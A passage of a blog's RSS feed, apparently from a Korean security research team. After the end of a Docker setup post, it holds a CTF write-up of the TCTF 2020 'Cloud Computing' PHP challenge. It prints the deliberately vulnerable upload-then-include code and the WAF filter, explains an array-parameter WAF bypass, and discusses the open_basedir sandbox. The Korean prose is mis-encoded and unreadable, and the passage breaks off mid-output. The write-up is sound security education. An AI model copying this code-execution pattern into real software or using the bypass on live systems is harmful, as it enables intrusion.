&lt;span class=&quot;k&quot;&gt;WORKDIR&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; /var/www/html/&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;EXPOSE&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; 80&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;CMD&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; [ &quot;/sbin/entrypoint.sh&quot; ]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Dockerfile Sample&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ë„ì»¤ ì´ë¯¸ì§€ëŠ” PHP-7.2ë¥¼ ì‚¬ìš©í•˜ì˜€ìœ¼ë©°, ì»¤ìŠ¤í…€ ë§ˆì´ì§•ì„ ìœ„í•´  Apache Conf ì„¤ì • ë³€ê²½ ë° ìµœì í™”ë¥¼ ì…‹íŒ…í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;docker-composeyml&quot;&gt;[Docker-compose.yml]&lt;/h2&gt;

&lt;hr /&gt;

&lt;div class=&quot;language-docker highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;version: &quot;3&quot;

services:
    web_encode:
        image: web_encode
        container_name: web_encode
        restart: always
        volumes: 
            - ./src:/var/www/html/
        build:
            context: ./
            dockerfile: ./Dockerfile
        networks:
            - web_encode
        ports: 
            - &quot;127.0.0.1:1129:80&quot;

        
networks:
    web_encode:
        driver: bridge
        ipam:
            config:
                - subnet: 192.168.0.8/24
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;docker-compose.yml&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;í¬íŠ¸ëŠ” ë‚´ë¶€ ë¡œì»¬ í˜¸ìŠ¤íŠ¸ì—ì„œ 1129ë²ˆ í¬íŠ¸ë¡œ ì ‘ì† ê°€ëŠ¥í•˜ê²Œ ì„¤ì • í•˜ì˜€ìŠµë‹ˆë‹¤. ì™¸ë¶€ì—ì„œ ì ‘ì†ì„ í•˜ê³ ì í•œë‹¤ë©´ â€œ1129:80â€ìœ¼ë¡œ ìˆ˜ì •í•˜ì‹œë©´ ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;delete&quot;&gt;[Delete]&lt;/h2&gt;

&lt;hr /&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;./&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;compose_down&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
        <pubDate>Mon, 01 Jun 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-06-01/Web-En-Decode-Code</link>
        <guid isPermaLink="true">http://localhost:4000/2020-06-01/Web-En-Decode-Code</guid>
        
        <category>programming</category>
        
        <category>tools</category>
        
        
      </item>
    
      <item>
        <title>[TCTF 2020] Cloud Computing</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ìµœìš©ì„ &lt;/p&gt;

&lt;h1 id=&quot;0-ê°œìš”&quot;&gt;0. ê°œìš”&lt;/h1&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;ol&gt;
      &lt;li&gt;27 11:00 ~ 2020. 06. 29 11:00 (48h) ì§„í–‰í•œ TCTF 2020 ë¬¸ì œ ì¤‘ misc ë¶„ì•¼ì˜ Cloud Computing ë¬¸ì œì— ëŒ€í•œ Write Upì…ë‹ˆë‹¤. í’€ì´ì— ì‚¬ìš©ëœ ì·¨ì•½ì ì€ subdirectoryë¥¼ ì´ìš©í•œ php open_basedir ìš°íšŒì…ë‹ˆë‹¤.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;1-ë¬¸ì œ-ì„¤ëª…&quot;&gt;1. ë¬¸ì œ ì„¤ëª…&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/assets/choi600.png&quot; alt=&quot;/assets/choi600.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Cloud Computing&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/choi601.png&quot; alt=&quot;/assets/choi601.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Cloud Computing ë¬¸ì œ ì„¤ëª…&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Cloud Computing ë¬¸ì œëŠ” misc ë¶„ì•¼ì˜ ë¬¸ì œë¡œ, ëŒ€íšŒ ê¸°ê°„ ë™ì•ˆ ì´ 42íŒ€ì´ í’€ì´í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë¬¸ì œ ì„¤ëª…ì—ëŠ” í’€ì´ì— íŒíŠ¸ê°€ ë ë§Œí•œ ë¬¸êµ¬ëŠ” ì—†ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;error_reporting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'function.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'sandbox/'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sha1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'REMOTE_ADDR'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'HTTP_USER_AGENT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;action&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'pwd'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'upload'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;waf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'waf sucks...'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;index.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'shell'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;initShellEnv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;index.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;highlight_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;index.php&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ë¬¸ì œ í˜ì´ì§€ì— ì ‘ê·¼í•´ë³´ë©´ ìœ„ì™€ ê°™ì€ ì†ŒìŠ¤ì½”ë“œë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë¬¸ì œ í˜ì´ì§€ì—ì„œëŠ” ì‚¬ìš©ìì˜ IPì™€ User Agent ì •ë³´ë¥¼ ì´ìš©í•˜ì—¬ ì›¹ë£¨íŠ¸ë¥¼ ê¸°ì¤€ìœ¼ë¡œ  &lt;code class=&quot;highlighter-rouge&quot;&gt;/sandbox/sha1(IP+UA)&lt;/code&gt; í´ë”ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì œê³µí•˜ëŠ” ê¸°ëŠ¥ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;?action=pwd
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;ì•ì„œ ìƒì„±í•œ ì‚¬ìš©ì ë””ë ‰í† ë¦¬($dir) ê²½ë¡œë¥¼ í™•ì¸í•©ë‹ˆë‹¤.&lt;/p&gt;

        &lt;p&gt;&lt;em&gt;( sandbox/373102940643ef0b8ab909ff4d486c5f584d7c86/ )&lt;/em&gt;&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;?action=upload&amp;amp;data=XXX
    &lt;ul&gt;
      &lt;li&gt;$dir ê²½ë¡œì— data íŒŒë¼ë¯¸í„°ì— ì‚½ì…í•œ ë‚´ìš©ì„ index.phpë¡œ ìƒì„±í•©ë‹ˆë‹¤.&lt;/li&gt;
      &lt;li&gt;data íŒŒë¼ë¯¸í„°ë¥¼ waf ì²˜ë¦¬ í›„ íƒì§€ë  ê²½ìš° &lt;code class=&quot;highlighter-rouge&quot;&gt;waf sucks...&lt;/code&gt;ë¥¼ ì¶œë ¥ í›„ ì¢…ë£Œí•©ë‹ˆë‹¤.&lt;/li&gt;
      &lt;li&gt;ì •ìƒì ìœ¼ë¡œ index.phpë¥¼ ìƒì„±í•  ê²½ìš° caseë¬¸ì— breakê°€ ì—†ì–´ 3. shell(ì½”ë“œ ì‹¤í–‰)ë¡œ ì´ë™í•©ë‹ˆë‹¤.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;?action=shell
    &lt;ul&gt;
      &lt;li&gt;$dirì„ íŒŒë¼ë¯¸í„°ë¡œ initShellEnvë¼ëŠ” í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.&lt;/li&gt;
      &lt;li&gt;ì´í›„ 2ì—ì„œ ìƒì„±í•œ index.phpë¥¼ includeí•˜ì—¬ ì‹¤í–‰í•©ë‹ˆë‹¤.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;2-ë¬¸ì œ-í’€ì´&quot;&gt;2. ë¬¸ì œ í’€ì´&lt;/h1&gt;

&lt;h2 id=&quot;2-1-waf&quot;&gt;2-1. WAF&lt;/h2&gt;

&lt;p&gt;ìœ„ ë¬¸ì œ ì„¤ëª…ì—ì„œ waf í•¨ìˆ˜ê°€ ìˆì—ˆìœ¼ë©°, ì´ í•¨ìˆ˜ëŠ” ê³µë°±, íŠ¹ìˆ˜ë¬¸ì ë“±ì„ í•„í„°ë§í•˜ëŠ” ê¸°ëŠ¥ì„ ê°€ì§€ê³  ìˆì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;í•˜ì§€ë§Œ phpì—ì„œëŠ” HTTP íŒŒë¼ë¯¸í„°ë¡œ ë°ì´í„°ë¥¼ ì „ì†¡í•  ë•Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;a[]=x&lt;/code&gt;ì™€ ê°™ì´ ì „ì†¡í•  ì‹œ Arrayë¡œ ì¸ì‹ì„ í•˜ë©´ì„œ ì´ë¥¼ WAFì—ì„œ ì²˜ë¦¬í•˜ì§€ ì•Šì„ ê²½ìš° ì†ì‰½ê²Œ ìš°íšŒê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;waf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/[!#%&amp;amp;'*+,-.: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;@^_`|A-Z]/m&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initShellEnv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;ini_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;open_basedir&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/var/www/html/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;function.php&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ì¶”ì¶œí•œ function.phpë¥¼ ì‚´í´ë³´ë©´ Arrayì— ëŒ€í•œ ë³„ë‹¤ë¥¸ ì²˜ë¦¬ê°€ ì—†ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;2-2-open_basedir&quot;&gt;2-2. open_basedir&lt;/h2&gt;

&lt;p&gt;function.phpì˜ &lt;code class=&quot;highlighter-rouge&quot;&gt;initShellEnv&lt;/code&gt; ë¥¼ ì‚´í´ë³´ë©´ open_basedirì„ ì‚¬ìš©ì ê²½ë¡œë¡œ ì„¤ì •í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/choi60.png&quot; alt=&quot;/assets/choi60.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;open_basedir&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;open_basedirì€ ì„¤ì •í•œ íŠ¹ì • ë””ë ‰í† ë¦¬ ë° í•˜ìœ„ ë””ë ‰í† ë¦¬ë§Œ ì ‘ê·¼í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤. ë³¸ ë¬¸ì œì—ì„œëŠ” ì´ ì„¤ì • ë•Œë¬¸ì— ìƒìœ„ ë””ë ‰í† ë¦¬ì— ì ‘ê·¼í•  ê²½ìš° ì—ëŸ¬ê°€ ë°œìƒí•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;Warning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;open_basedir&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;restriction&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;effect&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;../../&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;within&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;allowed&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sandbox&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;373102940643&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ef0b8ab909ff4d486c5f584d7c86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sandbox&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;373102940643&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ef0b8ab909ff4d486c5f584d7c86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;Warning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;../../&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;failed&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Operation&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;permitted&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sandbox&lt;/span&gt;&lt;span 